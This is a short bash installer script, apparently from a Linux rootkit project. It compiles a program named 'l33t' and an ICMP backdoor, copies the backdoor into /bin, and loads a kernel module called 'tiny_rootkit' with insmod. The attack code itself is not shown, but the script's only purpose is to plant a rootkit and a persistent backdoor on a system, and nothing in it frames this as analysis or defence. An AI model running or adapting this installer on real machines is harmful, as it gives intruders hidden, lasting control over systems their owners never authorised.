#!/bin/bash

echo -e "\n\e[00;31m################################### \e[01;36mCompiling...\e[00;31m ###################################\e[00m\n"
make
echo
gcc l33t.c -o l33t
gcc icmp_bkd.c -o icmp_bkd
cp icmp_bkd /bin/icmp_bkd
echo -e "\n\e[00;31m####################################################################################\e[00m\n"

echo -e "Loading module..."
insmod tiny_rootkit.ko
echo -e "LOADED!"
echo -e "\nTo Remove the module run: rmmod tiny_rootkit"

echo -e "\n\e[00;31m################################### \e[01;36mCleanning...\e[00;31m ###################################\e[00m\n" 
make clean
echo
